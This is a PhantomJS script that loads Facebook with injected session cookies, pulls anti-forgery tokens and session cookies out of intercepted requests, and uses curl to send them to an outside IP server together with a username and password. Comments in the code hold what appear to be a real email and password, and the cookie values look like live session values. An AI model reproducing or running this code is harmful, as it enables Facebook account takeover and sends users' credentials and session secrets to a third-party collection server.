var process = require("child_process");
var spawn = process.spaw;
var system = require('system');
var args = system.args;
var execFile = process.execFile
var page = require('webpage').create();
page.settings.userAgent = "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36";
var webPage = require('webpage');
var page = webPage.create();
phantom.clearCookies();
	


page.open('https://facebook.com', function(status) {
//	console.log("Status: " + status);
	 if(status === "success") {
	  // page.clearCookies();
	
        
        page.addCookie({
          'name'     : 'xs',   /* required property */
          'value'    : '41:otegGGDkAD7sIQ:2:1513239723:10377:6267',  /* required property */
          'domain'   : '.facebook.com',
          'path'     : '/',                /* required property */
          'httponly' : false,
          'secure'   : true,
        });
      
        page.addCookie({
          'name'     : 'c_user',   /* required property */
          'value'    : '100016951698809',  /* required property */
          'domain'   : '.facebook.com',
          'path'     : '/',                /* required property */
          'httponly' : false,
          'secure'   : true,
        });
         
        
        page.open('https://facebook.com', function(status) {

	        if(status === "success") {
	             page.render('example.png');
	              var cookies = page.cookies;
  
                  console.log('Listing cookies:');
                  for(var i in cookies) {
                    console.log(cookies[i].name + '=' + cookies[i].value);
                  }
	          
	             
	        }
	       phantom.exit();
            
        });
        page.onResourceRequested = function(requestData, networkRequest) {
        	//console.log( requestData.url);
        	var match = requestData.url.match(/bz/g);
        	if (match != null) {
        		var data =  JSON.parse('{"' + decodeURI(requestData.postData).replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g,'":"') + '"}')
        		if(data.fb_dtsg == undefined) {
        			console.log("login fail");
        			phantom.exit();
        			return;
        		}
        		console.log('Request (#' + requestData.id + '), postData: ' +  data.__dyn);
        		console.log("-----------------------------");
        		console.log("__dyn: " + data.__dyn );
        		console.log("__spin_r: " + data.__spin_r );
        		console.log("__spin_t: " + data.__spin_t );
        		console.log("__user: " + data.__user );
        		console.log("fb_dtsg: " + data.fb_dtsg );
        		console.log("jazoest: " + data.jazoest );
        		
        		var cookies = page.cookies;
        		var cookieStr = '';
        		console.log('Listing cookies:', cookies);
        		for(var i in cookies) {
        			console.log(cookies[i].name + '=' + cookies[i].value);
        			if(cookies[i].name == 'c_user') cookieStr += ';c_user=' + cookies[i].value;
        			if(cookies[i].name == 'xs') cookieStr += ';xs=' + cookies[i].value;
        			if(cookies[i].name == 'fr') cookieStr += ';fr=' + cookies[i].value;
        			if(cookies[i].name == 'datr') cookieStr += ';datr=' + cookies[i].value;
        		}
        		var urlParam = "username=" + args[1] //"huthamcauquan1@gmail.com" 
        		+ "&password=" + args[2] // "HoangVuong3031993" 
        		+ "&__dyn=" + data.__dyn
        		+"&__spin_r=" + data.__spin_r 
        		+"&__spin_t=" + data.__spin_t
        		+"&__user=" + data.__user
        		+"&fb_dtsg=" + data.fb_dtsg
        		+"&jazoest=" + data.jazoest
        		+"&cookie=" + cookieStr;
        		if(data.__user == 0 || data.__user == undefined){
        			phantom.exit()
        		}
        		console.log('cookie : ' + cookieStr);
        	//	var child = spawn("curl", ["" ,"http://facebook-nguyenvanvu.c9users.io:8080/AccountsFB/create?" + urlParam]);
        		execFile("curl", ["", "http://45.117.171.237:1337/AccountsFB/create?" + urlParam], null, function (err, stdout, stderr) {
        			console.log("execFileSTDOUT:", JSON.stringify(stdout))
        			console.log("execFileSTDERR:", JSON.stringify(stderr))
        		 	phantom.exit();
        		})
        	
        		//	page.render('example.png');
        	
        	}
        };
        
        var countReq = 0;
        
        page.onLoadFinished = function(status) {
        	countReq++;
        	console.log('Status done: ' + status);
        //	if(countReq >= 2) phantom.exit();
          // Do other things here...
        };
		 
	
         
          
    
  
	}
	//page.close();
	//
});
	






